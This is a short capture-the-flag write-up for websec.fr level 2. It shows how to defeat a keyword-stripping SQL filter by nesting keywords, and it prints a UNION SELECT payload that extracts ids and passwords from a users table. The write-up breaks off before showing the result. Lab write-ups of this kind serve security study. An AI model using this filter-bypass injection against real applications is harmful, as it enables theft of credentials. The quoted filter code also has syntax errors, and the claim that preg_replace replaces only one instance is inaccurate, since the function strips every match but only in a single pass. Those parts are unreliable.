# The level
![image](https://github.com/eladyesh/Anti_Virus/assets/102996033/4634a32a-6f5e-49bc-8b41-81c31d8ed7a2)

The application is really the same in [level 1](https://websec.fr/level01/source.php) but there is only 1 difference

```php
$searchWords = implode (['union', 'order''select', 'from', 'group', 'by'], '|');
$injection = preg_replace ('/' $searchWords . '/i', '', $injection);
```

They are replacing every instance of the 'searchWords' with an empty string with <b>preg_replace</b>. But ! preg_replace only replaces one instance of the word it finds. So, for instance :

```php
<?php
$searchWords = implode('|', ['union', 'order', 'select', 'from', 'group', 'by']);
$injection = "SELSELECTECT";
$injection = preg_replace('/' . $searchWords . '/i', '', $injection);
echo $injection;
?>
```

We get  ```SELECT```. Meaning, we can switch every word in our solution query from [level 1](https://eladyesh.github.io/posts/websec-1/) with a double instance of the word itself. Let's see


```php
$union = "UNIUNIONON";
$select = "SELSELECTECT";
$from = "FRFROMOM";
echo "1 $union $select id, password $from users WHERE id=1";
```

we get ```1 UNIUNIONON SELSELECTECT id, password FRFROMOM users WHERE id=1```

Paste, and we get
